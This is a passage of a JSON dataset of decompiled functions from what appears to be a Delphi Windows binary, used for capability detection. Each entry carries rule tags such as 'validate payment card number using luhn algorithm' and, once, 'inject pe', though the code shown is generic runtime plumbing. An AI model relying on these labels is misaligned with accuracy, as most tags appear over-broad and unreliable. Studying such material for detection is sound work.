        "decompiled_code": "\nvoid __fastcall fcn.00413fa8(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x414052;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.00413fa8::pvarg;\n    puStack52 = 0x413fd0;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x414035;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x484728)(&fcn.00413fa8::pvarg);\n    fcn.0041011c();\n    fcn.00404de4();\n    fcn.00404ed0(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.004104c0(0x41403c, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 357
    },
    "00414060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414060(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414060::pvarg;\n    puStack36 = 0x414075;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4140b6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    fcn.0041418c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4140bd;\n    uStack40 = 0x4140b5;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 206
    },
    "004146e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004146e0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack32 = &fcn.004146e0::pvarg;\n    puStack36 = 0x4146f5;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41474a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    if (pvarg != 0xd) {\n        fcn.0040fc88();\n    }\n    fcn.004062b0();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x414751;\n    uStack40 = 0x414749;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 245
    },
    "00414c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414c60(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414c60::pvarg;\n    puStack36 = 0x414c75;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x414cb6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    fcn.004107fc();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x414cbd;\n    uStack40 = 0x414cb5;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 205
    },
    "00414e5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00414e5c(uint param_1, int16_t *param_2)\n\n{\n    int16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint var_21h;\n    uint pvarg;\n    uint var_1h;\n    \n    puStack56 = &fcn.00414e5c::pvarg;\n    puStack60 = 0x414e74;\n    sub.oleaut32.dll_VariantInit();\n    uStack64 = 0x414f1f;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x414e8c;\n    puStack60 = &fcn.00414e5c::var_1h + 1;\n    fcn.004107fc();\n    if (*in_EAX == 0x101) {\n        puStack72 = 0x414e9c;\n        (**0x485818)();\n    }\n    if (*param_2 == 0x101) {\n        puStack72 = &fcn.00414e5c::var_21h;\n        puStack76 = 0x414eac;\n        sub.oleaut32.dll_VariantInit();\n        uStack80 = 0x414ef3;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &fcn.00414e5c::var_1h + 1;\n        fcn.004107fc();\n        (**0x485818)();\n        var_1h._0_1_ = fcn.00415710();\n        *in_FS_OFFSET = uStack84;\n        puStack76 = 0x414f09;\n        uStack80 = 0x414ef2;\n        fcn.004104c0();\n        return;\n    }\n    puStack72 = 0x414f06;\n    var_1h._0_1_ = fcn.00415710();\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x414f26;\n    uStack64 = 0x414f1e;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 563
    },
    "00415778": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415778(void)\n\n{\n    uint uVar1;\n    uint *in_EAX;\n    \n    if (7 < *in_EAX) {\n        uVar1 = *in_EAX;\n        *in_EAX = 0;\n        fcn.004107fc(uVar1, in_EAX[1], in_EAX[2], in_EAX[3]);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "004158fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid fcn.004158fc(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x415a22;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x415940;\n        puStack540 = &stack0xfffffffc;\n        fcn.0040461c();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x415958;\n        puStack540 = &stack0xfffffffc;\n        fcn.0040461c();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x415970;\n        puStack540 = &stack0xfffffffc;\n        fcn.0040461c();\n    }\n    else {\n        cVar1 = fcn.00417654();\n        if (cVar1 == '\\0') {\n            fcn.00408d3c();\n            puStack552 = 0x4159e3;\n            fcn.004048d4();\n        }\n        else {\n            puStack552 = &fcn.004158fc::var_104h;\n            fcn.00403770();\n            fcn.00402cd0();\n            fcn.0040482c();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.004048d4();\n    }\n    if ((in_AX & 0x4000) != 0) {\n        fcn.004048d4();\n    }\n    *in_FS_OFFSET = puStack552;\n    uStack544 = 0x415a29;\n    iStack548 = 0x415a21;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 492
    },
    "00415c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00415c20(void)\n\n{\n    float10 fVar1;\n    \n    fVar1 = fcn.00412e50();\n    return fVar1;\n}\n",
        "token_count": 41
    },
    "00415d4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00415d4c(void)\n\n{\n    char cVar1;\n    ulong uStack12;\n    \n    cVar1 = fcn.00415c58();\n    if (cVar1 == '\\0') {\n        fcn.00410110();\n    }\n    return uStack12;\n}\n",
        "token_count": 67
    },
    "00415d74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00415d74(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint16_t *puStack8;\n    \n    cVar1 = fcn.00415c58();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *puStack8;\n    }\n    return CONCAT44(puStack8, uVar2);\n}\n",
        "token_count": 99
    },
    "00415e24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00415e24(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    uint uVar1;\n    uint uStack4;\n    \n    if (param_2 != '\\0') {\n        uVar1 = fcn.00415c58();\n        return CONCAT44(uStack4, uVar1);\n    }\n    return CONCAT44(uStack4, in_EAX & 0xffff0000 | *in_EAX & 0xffff2000 | (*in_EAX & 0xffff2000) == 0x2000);\n}\n",
        "token_count": 130
    },
    "00415ea8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415ea8(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint rgIndices)\n\n{\n    char cVar1;\n    uint16_t **in_FS_OFFSET;\n    uint16_t *puStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint ppvData;\n    uint16_t *psa;\n    uint var_12h;\n    uint pv;\n    \n    iStack40 = 0x415ebd;\n    cVar1 = fcn.00415c58();\n    if (cVar1 == '\\0') {\n        iStack40 = 0x415ecb;\n        fcn.00410110();\n    }\n    if (*psa != arg_10h) {\n        iStack40 = 0x415ee0;\n        fcn.00410110();\n    }\n    iStack40 = &fcn.00415ea8::var_12h + 2;\n    puStack44 = 0x415ee9;\n    sub.oleaut32.dll_VariantInit();\n    uStack48 = 0x415f68;\n    puStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    if ((var_12h & 0xfff) == 0xc) {\n        puStack44 = &stack0xfffffffc;\n        sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &fcn.00415ea8::rgIndices, &fcn.00415ea8::ppvData);\n        fcn.00410110();\n        fcn.004107fc();\n    }\n    else {\n        puStack44 = &stack0xfffffffc;\n        sub.oleaut32.dll_SafeArrayGetElement(psa, &fcn.00415ea8::rgIndices, &fcn.00415ea8::pv);\n        fcn.00410110();\n        var_12h._2_2_ = var_12h & 0xfff;\n    }\n    fcn.004107fc();\n    *in_FS_OFFSET = psa;\n    fcn.004104c0(0x415f6f);\n    return;\n}\n",
        "token_count": 487
    },
    "00415f98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415f98(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint rgIndices)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint16_t **in_FS_OFFSET;\n    uint16_t *puStack64;\n    uint16_t *puStack60;\n    uint *puStack56;\n    uint *puStack52;\n    uint *ppvData;\n    uint var_20h;\n    int16_t var_1ah;\n    uint16_t *psa;\n    uint var_12h;\n    uint *var_8h;\n    \n    puStack52 = 0x415fb1;\n    cVar1 = fcn.00415c58();\n    if (cVar1 == '\\0') {\n        puStack52 = 0x415fbf;\n        fcn.00410110();\n    }\n    puStack52 = 0x415fcc;\n    cVar1 = fcn.00415c58();\n    if (cVar1 == '\\0') {\n        puStack52 = 0x415fd9;\n        cVar1 = fcn.00415e6c();\n        if ((cVar1 == '\\0') && (var_1ah != 0x100)) {\n            puStack52 = 0x415fef;\n            fcn.00410110();\n        }\n    }\n    if (*psa != arg_10h) {\n        puStack52 = 0x416004;\n        fcn.00410110();\n    }\n    uVar2 = var_12h & 0xfff;\n    if (uVar2 == 0xc) {\n        if (var_1ah == 0x100) {\n            puStack52 = 0x416026;\n            cVar1 = fcn.00415b00();\n            if (cVar1 == '\\0') goto code_r0x0041604f;\n        }\n        puStack52 = &fcn.00415f98::ppvData;\n        puStack56 = &fcn.00415f98::rgIndices;\n        puStack60 = psa;\n        puStack64 = 0x41603b;\n        sub.oleaut32.dll_SafeArrayPtrOfIndex();\n        puStack64 = 0x416040;\n        fcn.00410110();\n        puStack64 = 0x41604a;\n        fcn.004107fc();\n        return;\n    }\ncode_r0x0041604f:\n    puStack52 = &fcn.00415f98::var_12h + 2;\n    puStack56 = 0x416058;\n    sub.oleaut32.dll_VariantInit();\n    puStack60 = 0x4160d0;\n    puStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if (uVar2 == 0xc) {\n        puStack56 = &stack0xfffffffc;\n        fcn.00410ab8();\n        ppvData = &fcn.00415f98::var_12h + 2;\n    }\n    else {\n        puStack56 = &stack0xfffffffc;\n        fcn.00410d48();\n        if ((uVar2 - 8 < 2) || (uVar2 - 8 == 5)) {\n            ppvData = var_8h;\n        }\n        else {\n            ppvData = &fcn.00415f98::var_8h;\n        }\n    }\n    sub.oleaut32.dll_SafeArrayPutElement(psa, &fcn.00415f98::rgIndices, ppvData);\n    fcn.00410110();\n    *in_FS_OFFSET = psa;\n    fcn.004104c0(0x4160d7);\n    return;\n}\n",
        "token_count": 835
    },
    "00416108": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00416108(int32_t param_1, int32_t param_2, int32_t *param_3)\n\n{\n    int64_t iVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 0;\n    iVar2 = param_2;\n    if (-1 < param_1) goto code_r0x00416123;\n    do {\n        if (in_EAX == NULL) break;\n        in_EAX = *in_EAX;\ncode_r0x00416123:\n        iVar4 = param_3 + *(param_3 + 1);\n        iVar1 = *(param_2 + iVar3 * 4) * *(iVar4 + 2);\n        iVar2 = iVar1 >> 0x20;\n        param_3 = *(iVar4 + 6);\n        if (param_3 != NULL) {\n            param_3 = *param_3;\n        }\n        in_EAX = in_EAX + iVar1;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 <= param_1);\n    return CONCAT44(iVar2, in_EAX);\n}\n",
        "token_count": 265
    },
    "0041614c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041614c(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint uStack4;\n    \n    uStack4 = 0;\n    if ((in_EAX != 0) && (puVar1 = *(in_EAX + *(in_EAX + 1) + 6),  puVar1 != NULL)) {\n        uStack4 = *puVar1;\n    }\n    return CONCAT44(uStack4, uStack4);\n}\n",
        "token_count": 108
    },
    "00416b34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416b34(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if ((arg_8h != *(in_EAX + 4)) && (cVar1 = fcn.00417654(),  cVar1 != '\\0')) {\n        (**(*var_8h + 0x1c))(arg_8h);\n        return;\n    }\n    fcn.00416f74();\n    return;\n}\n",
        "token_count": 125
    },
    "00416b88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00416b88(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t in_ECX;\n    uint var_1h;\n    \n    (**(*in_EAX + 0x38))(&var_1h);\n    return *(arg_8h * 3 + 0x483546 + (in_ECX >> 0x18));\n}\n",
        "token_count": 107
    },
    "00416bfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00416bfc(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.00416c40();\n    *0x48356c = *0x48356c + 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "00416c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00416c40(uint16_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t extraout_CX;\n    char extraout_DL;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint *puVar5;\n    uint in_stack_fffffe7c;\n    uint uStack380;\n    uint uStack376;\n    uchar *puStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uchar *puStack356;\n    uint var_140h;\n    uint var_13ch;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0;\n    var_20h = 0;\n    var_1ch = 0;\n    if (param_2 != '\\0') {\n        puStack356 = 0x416c69;\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    uStack360 = 0x416e9d;\n    uStack364 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe94;\n    uStack368 = 0x416c8b;\n    puStack356 = &stack0xfffffffc;\n    var_8h._0_2_ = param_1;\n    var_8h._3_1_ = param_2;\n    var_4h = in_EAX;\n    fcn.004037f0();\n    uStack368 = 0x485828;\n    puStack372 = 0x416c95;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack376 = 0x416e70;\n    uStack380 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe84;\n    iVar3 = var_8h - 0x100;\n    if ((iVar3 < 0) || (puStack372 = &stack0xfffffffc,  var_8h < 0x10f)) {\n        var_18h = **0x4847c0;\n        var_14h._0_1_ = 0xb;\n        var_10h = var_8h;\n        var_ch._0_1_ = 0;\n        puVar5 = &fcn.00416c40::var_18h;\n        in_stack_fffffe7c = 1;\n        puStack372 = &stack0xfffffffc;\n        fcn.0040675c();\n        fcn.0040c918(in_stack_fffffe7c, puVar5);\n        fcn.00403fc0();\n    }\n    iVar1 = fcn.0040583c();\n    if (iVar1 <= iVar3) {\n        iVar2 = (iVar3 / 0xf + 1) * 0xf;\n        if (0x7ff < iVar2) {\n            fcn.0040675c();\n            fcn.0040c8dc();\n            fcn.00403fc0();\n        }\n        fcn.00405a18(iVar2);\n        iVar2 = fcn.0040583c();\n        if (iVar1 <= iVar2 + -1) {\n            iVar2 = ((iVar2 + -1) - iVar1) + 1;\n            do {\n                *(*0x485824 + iVar1 * 4) = 0;\n                iVar1 = iVar1 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    iVar1 = *(*0x485824 + iVar3 * 4);\n    if (iVar1 != 0) {\n        if (iVar1 == *0x483478) {\n            var_18h = **0x4847c0;\n            var_14h._0_1_ = 0xb;\n            var_10h = var_8h;\n            var_ch._0_1_ = 0;\n            puVar5 = &fcn.00416c40::var_18h;\n            uVar4 = 1;\n            fcn.0040675c();\n            fcn.0040c918(uVar4, puVar5);\n            fcn.00403fc0();\n        }\n        else {\n            var_3ch = **0x4847c0;\n            var_38h._0_1_ = 0xb;\n            var_34h = var_8h;\n            var_30h._0_1_ = 0;\n            fcn.00403770();\n            var_2ch = &fcn.00416c40::var_13ch;\n            var_28h._0_1_ = 4;\n            puVar5 = &fcn.00416c40::var_3ch;\n            uVar4 = 2;\n            fcn.0040675c();\n            fcn.0040c918(uVar4, puVar5);\n            fcn.00403fc0();\n        }\n    }\n    *(*0x485824 + iVar3 * 4) = var_4h;\n    *(var_4h + 4) = var_8h;\n    *in_FS_OFFSET = in_stack_fffffe7c;\n    uStack380 = 0x416e77;\n    sub.kernel32.dll_LeaveCriticalSection_1(0x485828);\n    return;\n}\n",
        "token_count": 1309
    },
    "00416ec8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00416ec8(void)\n\n{\n    uint uVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    int32_t var_5h;\n    \n    uStack16 = 0x416ed3;\n    *NULL = fcn.00403bc0();\n    uStack16 = 0x485828;\n    uStack20 = 0x416ee3;\n    var_5h._0_1_ = extraout_DL;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(stack0xfffffff8 + 4) != 0) {\n        *(*0x485824 + -0x400 + *(stack0xfffffff8 + 4) * 4) = *0x483478;\n    }\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x416f32;\n    uStack24 = 0x485828;\n    uStack28 = 0x416f2a;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 283
    },
    "0041770c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041770c(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack316;\n    uint uStack312;\n    uchar *puStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_110h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x4177e2;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    uStack304 = 0x485828;\n    puStack308 = 0x41773f;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack312 = 0x4177c5;\n    uStack316 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec4;\n    puStack308 = &stack0xfffffffc;\n    iVar3 = fcn.00405844();\n    if (-1 < iVar3) {\n        iVar3 = iVar3 + 1;\n        iVar4 = 0;\n        do {\n            iVar1 = *(*0x485824 + iVar4 * 4);\n            if ((iVar1 != 0) && (iVar1 != *0x483478)) {\n                fcn.00403770();\n                fcn.0040482c();\n                cVar2 = fcn.004089f4();\n                if (cVar2 != '\\0') {\n                    *param_2 = iVar1;\n                    break;\n                }\n            }\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack316;\n    puStack308 = 0x4177cc;\n    uStack312 = 0x485828;\n    uStack316 = 0x4177c4;\n    sub.kernel32.dll_LeaveCriticalSection_1();\n    return;\n}\n",
        "token_count": 486
    },
    "00417c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417c90(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040c9d4(0, auStack12);\n    fcn.00403fc0();\n    return;\n}\n",
        "token_count": 66
    },
    "00417cbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00417cbc(uint param_1)\n\n{\n    uint uVar1;\n    \n    fcn.00403764(param_1);\n    uVar1 = fcn.00417ce8();\n    return CONCAT44(uVar1, uVar1);\n}\n",
        "token_count": 60
    },
    "00417ce8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00417ce8(uint param_1)\n\n{\n    uint uVar1;\n    \n    fcn.00403a6c(param_1);\n    uVar1 = fcn.00418594();\n    return CONCAT44(uVar1, uVar1);\n}\n",
        "token_count": 62
    },
    "00417f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00417f88(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00412a5c();\n    uVar2 = fcn.00402f70();\n    iVar1 = uVar2 >> 0x20;\n    if (iVar1 == arg_14h) {\n        if (uVar2 < arg_10h) goto code_r0x00417fcc;\n    }\n    else if (iVar1 < arg_14h) goto code_r0x00417fcc;\n    if (iVar1 == arg_ch) {\n        if (uVar2 <= arg_8h) {\n            return uVar2;\n        }\n    }\n    else if (iVar1 <= arg_ch) {\n        return uVar2;\n    }\ncode_r0x00417fcc:\n    fcn.0040c998();\n    fcn.00403fc0();\n    return uVar2;\n}\n",
        "token_count": 253
    },
    "00418730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418730(void)\n\n{\n    int32_t iVar1;\n    uchar auStack20 [4];\n    uchar uStack16;\n    \n    iVar1 = fcn.004184c0();\n    if (iVar1 < 0) {\n        uStack16 = 0xb;\n        fcn.0040c9d4(0, auStack20);\n        fcn.00403fc0();\n    }\n    fcn.004186b0();\n    return;\n}\n",
        "token_count": 105
    },
    "00418894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418894(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    for (iVar2 = 0;\n        (((cVar1 = *(*in_EAX + iVar2),  cVar1 != '\\0' && (cVar1 != ' ')) && (cVar1 != ',')) && (cVar1 != ']'));\n        iVar2 = iVar2 + 1) {\n    }\n    fcn.004046b8();\n    for (; ((cVar1 = *(*in_EAX + iVar2),  cVar1 == ' ' || (cVar1 == ',')) || (cVar1 == ']')); iVar2 = iVar2 + 1) {\n    }\n    *in_EAX = *in_EAX + iVar2;\n    return;\n}\n",
        "token_count": 181
    },
    "004189d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004189d8(uint8_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    pcVar1 = *(param_2 + 4);\n    if (*(param_2 + 7) == 0xff) {\n        puVar3 = (pcVar1 & 0xffffff) + in_EAX;\n        iVar2 = *puVar3 + 1;\n        for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *param_1 = *puVar3;\n            puVar3 = puVar3 + 1;\n            param_1 = param_1 + 1;\n        }\n    }\n    else if (*(param_2 + 7) < 0xfe) {\n        (*pcVar1)();\n    }\n    else {\n        (**(pcVar1 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "00418a1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
